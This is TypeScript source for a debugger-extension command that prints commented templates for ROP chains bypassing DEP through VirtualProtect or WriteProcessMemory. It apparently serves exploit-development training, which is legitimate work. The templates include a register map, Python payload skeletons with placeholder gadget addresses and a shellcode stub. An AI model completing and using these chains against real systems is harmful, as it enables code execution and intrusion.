import { Command, CommandResult } from "../core/registry";
import * as out from "../core/output";

function vpTemplate(mod: string): void {
  out.section("VirtualProtect DEP Bypass — ROP Chain Skeleton");
  out.print("Prototype: BOOL VirtualProtect(lpAddress, dwSize, flNewProtect, lpflOldProtect)");
  out.print("Goal:      mark shellcode region PAGE_EXECUTE_READWRITE (flNewProtect = 0x40)");

  out.section("Step 1 — find addresses");
  out.print(`  VirtualProtect addr:   dx @$osed().sc.iat_find("VirtualProtect")`);
  out.print(`  jmp esp (dispatch):    dx @$osed().find_bytes({ module: "${mod}", bytes: [0xFF, 0xE4] })`);
  out.print(`  pushad ; ret:          dx @$osed().find_bytes({ module: "${mod}", bytes: [0x60, 0xC3] })`);
  out.print(`  Gadgets (pop/inc/neg): dx @$osed().rop_suggest({ module: "${mod}", engine: "semantic" })`);
  out.print(`  Stack adjustments:     dx @$osed().add_esp({ module: "${mod}" })`);
  out.print(`  Writable addr:         dx @$osed().modules()  -- pick a .data section address`);

  out.section("Step 2 — PUSHAD technique register map");
  out.print("  After PUSHAD ; RET, the stack looks like:");
  out.print("    [ESP+0]  = EDI  <- consumed by RET (set to VirtualProtect address)");
  out.print("    [ESP+4]  = ESI  <- return addr for VP's RETN 10h (set to jmp esp)");
  out.print("    [ESP+8]  = EBP  <- lpAddress  (set to shellcode start)");
  out.print("    [ESP+12] = saved_ESP <- dwSize (stack addr — rounds up, usually OK)");
  out.print("    [ESP+16] = EBX  <- flNewProtect = 0x40");
  out.print("    [ESP+20] = EDX  <- lpflOldProtect (writable dummy)");
  out.print("    [ESP+24] = ECX  <- (unused by VirtualProtect)");
  out.print("    [ESP+28] = EAX  <- (unused by VirtualProtect)");

  out.section("Step 3 — Python skeleton");
  out.print("import struct");
  out.print("def p32(v): return struct.pack('<I', v)");
  out.print("");
  out.print("OFFSET   = ???           # bytes from buffer start to EIP control");
  out.print("VP       = 0x????????    # VirtualProtect  dx @$osed().sc.iat_find(\"VirtualProtect\")");
  out.print("JMP_ESP  = 0x????????    # jmp esp         dx @$osed().find_bytes({bytes:[0xFF,0xE4]})");
  out.print("WRITABLE = 0x????????    # writable addr   dx @$osed().modules() -> .data section");
  out.print("LP_ADDR  = 0x????????    # shellcode addr  compute from ESP (see step 4)");
  out.print("");
  out.print("rop_chain = b\"\"");
  out.print("");
  out.print("# ── Register setup (PUSHAD technique) ──");
  out.print("rop_chain += p32(0x????????)  # pop edi ; ret");
  out.print("rop_chain += p32(VP)          # EDI = VirtualProtect address");
  out.print("");
  out.print("rop_chain += p32(0x????????)  # pop esi ; ret");
  out.print("rop_chain += p32(JMP_ESP)     # ESI = jmp esp (return to shellcode after VP)");
  out.print("");
  out.print("rop_chain += p32(0x????????)  # pop ebp ; ret");
  out.print("rop_chain += p32(LP_ADDR)     # EBP = lpAddress (shellcode start, see step 4)");
  out.print("");
  out.print("rop_chain += p32(0x????????)  # pop ebx ; ret");
  out.print("rop_chain += p32(0x00000040)  # EBX = flNewProtect (PAGE_EXECUTE_READWRITE)");
  out.print("");
  out.print("rop_chain += p32(0x????????)  # pop edx ; ret");
  out.print("rop_chain += p32(WRITABLE)    # EDX = lpflOldProtect dummy");
  out.print("");
  out.print("rop_chain += p32(0x????????)  # pop ecx ; ret  (ECX unused — any writable value)");
  out.print("rop_chain += p32(WRITABLE)");
  out.print("");
  out.print("rop_chain += p32(0x????????)  # pop eax ; ret  (EAX unused — put 0 or junk)");
  out.print("rop_chain += p32(0x90909090)");
  out.print("");
  out.print("rop_chain += p32(0x????????)  # pushad ; ret");
  out.print("                               #   dx @$osed().find_bytes({bytes:[0x60,0xC3]})");
  out.print("");
  out.print("# ── NOP sled + shellcode ──");
  out.print("nop_sled  = b\"\\x90\" * 16    # dx @$osed().nop(16)");
  out.print("shellcode = nop_sled + b\"\\xfc\\xe8...\"  # your payload");
  out.print("                               # dx @$osed().encode({shellcode:\"...\",exclude:[0,10,13]})");
  out.print("");
  out.print("payload = b\"A\" * OFFSET + rop_chain + shellcode");

  out.section("Step 4 — compute LP_ADDR (shellcode stack address)");
  out.print("  The PUSHAD technique uses the saved ESP (stack addr before PUSHAD) as dwSize.");
  out.print("  To find LP_ADDR (EBP = shellcode location on stack):");
  out.print("  1. Run exploit with 'CC' shellcode; check EBP at VirtualProtect breakpoint.");
  out.print("  2. Or: prepend gadgets to capture ESP and add the chain-to-shellcode offset:");
  out.print("       dx @$osed().rop_suggest(...)  ->  push esp ; pop eax ; ret");
  out.print("       dx @$osed().add_esp(...)      ->  add eax, N ; ret   (N = measured offset)");
  out.print("     Then use a  mov [writable], eax ; ret  gadget and patch EBP from that addr.");
}

function wpmTemplate(mod: string): void {
  out.section("WriteProcessMemory DEP Bypass — ROP Chain Skeleton");
  out.print("Prototype: BOOL WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpBytesWritten)");
  out.print("Goal:      copy shellcode into a known-executable .text section, then jump to it.");

  out.section("Find addresses");
  out.print(`  WriteProcessMemory:  dx @$osed().sc.iat_find("WriteProcessMemory")`);
  out.print(`  Writable addr:       dx @$osed().modules()  -- any .data section`);
  out.print(`  Executable target:   dx @$osed().modules()  -- any .text section address`);
  out.print(`  Gadgets:             dx @$osed().rop_suggest({ module: "${mod}", engine: "semantic" })`);

  out.section("Python skeleton");
  out.print("import struct");
  out.print("def p32(v): return struct.pack('<I', v)");
  out.print("");
  out.print("OFFSET      = ???          # EIP control offset");
  out.print("WPM         = 0x????????   # WriteProcessMemory  dx @$osed().sc.iat_find(...)");
  out.print("EXEC_TARGET = 0x????????   # executable .text address to write shellcode into");
  out.print("WRITABLE    = 0x????????   # .data writable addr");
  out.print("SC_SRC      = 0x????????   # shellcode source (stack addr — compute dynamically)");
  out.print("");
  out.print("# PUSHAD register map for WriteProcessMemory(hProcess, lpBase, lpBuf, nSize, lpWritten):");
  out.print("#   EDI = WPM            ESI = return addr   EBP = hProcess (0xFFFFFFFF = current)");
  out.print("#   EBX = lpBaseAddress  EDX = lpBuffer      ECX = nSize    EAX = lpBytesWritten");
  out.print("");
  out.print("rop_chain = b\"\"");
  out.print("rop_chain += p32(0x????????)  # pop edi ; ret");
  out.print("rop_chain += p32(WPM)");
  out.print("rop_chain += p32(0x????????)  # pop esi ; ret");
  out.print("rop_chain += p32(0x????????)  # return addr after WPM (jmp to EXEC_TARGET)");
  out.print("rop_chain += p32(0x????????)  # pop ebp ; ret");
  out.print("rop_chain += p32(0xFFFFFFFF)  # hProcess = GetCurrentProcess()");
  out.print("rop_chain += p32(0x????????)  # pop ebx ; ret");
  out.print("rop_chain += p32(EXEC_TARGET) # lpBaseAddress");
  out.print("rop_chain += p32(0x????????)  # pop edx ; ret");
  out.print("rop_chain += p32(SC_SRC)      # lpBuffer (shellcode source on stack)");
  out.print("rop_chain += p32(0x????????)  # pop ecx ; ret");
  out.print("rop_chain += p32(0x00000201)  # nSize");
  out.print("rop_chain += p32(0x????????)  # pop eax ; ret");
  out.print("rop_chain += p32(WRITABLE)    # lpBytesWritten (dummy writable)");
  out.print("rop_chain += p32(0x????????)  # pushad ; ret");
  out.print("");
  out.print("shellcode = b\"\\x90\" * 16 + b\"\\xfc\\xe8...\"");
  out.print("payload   = b\"A\" * OFFSET + rop_chain + shellcode");
}

export function createRopTemplateCommand(): Command {
  return {
    name: "rop_template",
    description: "Print a commented VirtualProtect or WriteProcessMemory ROP chain skeleton.",
    usage: "dx @$osed.rop_template({ api: 'VirtualProtect', module: 'essfunc' })",
    examples: [
      "dx @$osed.rop_template({ api: 'VirtualProtect', module: 'essfunc' })",
      "dx @$osed.rop_template({ api: 'WriteProcessMemory', module: 'essfunc' })",
    ],
    schema: {
      api: { type: "string", enum: ["VirtualProtect", "WriteProcessMemory"], default: "VirtualProtect" },
      module: { type: "string", default: "TARGET_MODULE" },
    },
    execute(options: Record<string, unknown>): CommandResult {
      const api = (options.api as string | undefined) ?? "VirtualProtect";
      const mod = (options.module as string | undefined) ?? "TARGET_MODULE";

      if (api === "WriteProcessMemory") {
        wpmTemplate(mod);
      } else {
        vpTemplate(mod);
      }

      return {
        command: "rop_template",
        args: options,
        success: true,
        findings: [{ api, module: mod }],
        warnings: [],
        errors: [],
      };
    },
  };
}
